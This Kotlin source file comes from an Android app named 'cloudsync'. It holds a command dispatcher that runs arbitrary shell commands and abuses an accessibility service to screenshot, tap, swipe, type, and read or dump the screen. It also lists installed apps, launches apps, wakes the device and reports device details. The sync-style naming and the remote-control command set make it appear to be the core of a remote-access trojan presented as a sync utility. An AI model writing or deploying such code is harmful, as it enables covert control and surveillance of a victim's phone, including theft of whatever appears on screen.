package com.cloudsync.app

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import org.json.JSONArray
import org.json.JSONObject

object Comandos {

    fun ejecutar(ctx: Context, cmd: String, a: JSONObject): Pair<Boolean, String> {
        return try {
            when (cmd) {
                "ping" -> Pair(true, JSONObject().put("pong", System.currentTimeMillis()).toString())
                "info" -> Pair(true, info(ctx))
                "device_id" -> Pair(true, JSONObject()
                    .put("id", Prefs(ctx).deviceId).put("host", Build.MODEL).toString())
                "battery_info" -> Pair(true, bateria(ctx))
                "apps" -> Pair(true, apps(ctx))
                "open" -> { abrir(ctx, a.optString("pkg")); Pair(true, "ok") }
                "shell" -> Pair(true, shell(a.optString("cmd")))
                "home" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_HOME); Pair(true, "ok") }
                "back" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_BACK); Pair(true, "ok") }
                "recents" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_RECENTS); Pair(true, "ok") }
                "notifs" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_NOTIFICATIONS); Pair(true, "ok") }
                "lock" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_LOCK); Pair(true, "ok") }
                "wake" -> { despertar(ctx); Pair(true, "ok") }
                "screenshot" -> Pair(true, SyncAccessibility.capturar(ctx, a.optBoolean("force", false)))
                "tap" -> { SyncAccessibility.tap(a.optInt("x"), a.optInt("y")); Pair(true, "ok") }
                "swipe" -> {
                    SyncAccessibility.swipe(a.optInt("x1"), a.optInt("y1"),
                        a.optInt("x2"), a.optInt("y2"), a.optInt("ms", 250))
                    Pair(true, "ok")
                }
                "text" -> Pair(true, SyncAccessibility.escribir(a.optString("text")))
                "tap_text" -> Pair(true, SyncAccessibility.tapTexto(a.optString("text")))
                "dump" -> Pair(true, SyncAccessibility.dump())
                "screen_text" -> Pair(true, SyncAccessibility.textoVisible())
                "sleep" -> { Thread.sleep(a.optLong("ms", 500)); Pair(true, "ok") }
                "die" -> Pair(true, "ok")
                else -> Pair(true, "unsupported:$cmd")
            }
        } catch (e: Exception) {
            Pair(false, "error: " + (e.message ?: e.toString()))
        }
    }

    private fun shell(c: String): String {
        if (c.isBlank()) return ""
        val pr = Runtime.getRuntime().exec(arrayOf("sh", "-c", c))
        val out = pr.inputStream.bufferedReader().readText()
        val err = pr.errorStream.bufferedReader().readText()
        pr.waitFor()
        return (out + err).take(100000)
    }

    private fun abrir(ctx: Context, pkg: String) {
        if (pkg.isBlank()) throw Exception("falta pkg")
        val i = ctx.packageManager.getLaunchIntentForPackage(pkg)
            ?: Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=$pkg"))
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        ctx.startActivity(i)
    }

    private fun apps(ctx: Context): String {
        val pm = ctx.packageManager
        val arr = JSONArray()
        for (p in pm.getInstalledPackages(0)) {
            arr.put(JSONObject()
                .put("pkg", p.packageName)
                .put("name", p.applicationInfo?.loadLabel(pm)?.toString() ?: "")
                .put("ver", p.versionName)
                .put("sistema", ((p.applicationInfo?.flags ?: 0) and 1) != 0))
            if (arr.length() >= 600) break
        }
        return arr.toString()
    }

    private fun info(ctx: Context): String {
        val mem = ActivityManager.MemoryInfo()
        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).getMemoryInfo(mem)
        return JSONObject()
            .put("host", Build.MODEL)
            .put("marca", Build.MANUFACTURER)
            .put("os", "Android " + Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("ram_total_mb", mem.totalMem / 1048576)
            .put("ram_libre_mb", mem.availMem / 1048576)
            .put("device_id", Prefs(ctx).deviceId)
            .put("accesibilidad", SyncAccessibility.listo())
            .toString()
    }

    private fun bateria(ctx: Context): String {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val cargando = (i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1) ==
            BatteryManager.BATTERY_STATUS_CHARGING
        return JSONObject().put("pct", pct).put("charging", cargando).toString()
    }

    private fun despertar(ctx: Context) {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        @Suppress("DEPRECATION")
        val w = pm.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "cs:wake"
        )
        w.acquire(3000)
    }
}
